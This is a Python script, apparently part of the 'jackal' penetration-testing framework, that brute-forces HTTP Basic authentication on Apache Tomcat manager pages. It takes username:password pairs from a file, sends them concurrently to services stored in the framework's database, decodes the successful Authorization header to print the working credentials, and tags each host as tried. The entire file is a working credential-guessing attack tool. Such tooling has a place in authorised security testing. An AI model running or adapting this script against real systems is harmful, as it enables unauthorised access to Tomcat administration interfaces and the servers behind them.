#!/usr/bin/env python3
import base64
import sys
import grequests
import gevent
from jackal import ServiceSearch
from jackal.utils import print_success, print_notification, print_error
from builtins import input


def brutefore_passwords(ip, url, credentials):
    """
        Bruteforce function, will try all the credentials at the same time, splits the given credentials at a ':'.
    """
    auth_requests = []
    for credential in credentials:
        split = credential.strip().split(':')
        username = split[0]
        password = ''
        if len(split) > 1:
            password = split[1]
        auth_requests.append(grequests.get(url, auth=(username, password)))
    results = grequests.map(auth_requests)
    for result in results:
        if result.status_code == 200:
            creds = result.request.headers['Authorization'].split(' ')[1]
            creds = base64.b64decode(creds).decode('utf-8')
            creds = creds.split(':')
            print_success("Found a password for tomcat: {0}:{1} at ip: {2}".format(
                creds[0], creds[1], ip))


def main():
    """
        Checks the arguments to brutefore and spawns greenlets to perform the bruteforcing.
    """
    services = ServiceSearch()
    arguments = services.argparser.parse_args()

    if not arguments.file:
        print_error("Please provide a file with credentials seperated by ':'")
        sys.exit()

    if arguments.port or arguments.search or arguments.tags or services.is_pipe:
        services = services.get_services()
    else:
        services = services.search(search="Tomcat", up=True, tags='!tomcat_brute')

    credentials = []
    with open(arguments.file, 'r') as f:
        credentials = f.readlines()

    for service in services:
        url = 'http://{}:{}/manager/html'
        gevent.spawn(brutefore_passwords, service.address, url.format(service.address, service.port), credentials)
        service.add_tag('tomcat_brute')
        service.update(tags=service.tags)

    gevent.wait()


if __name__ == '__main__':
    main()
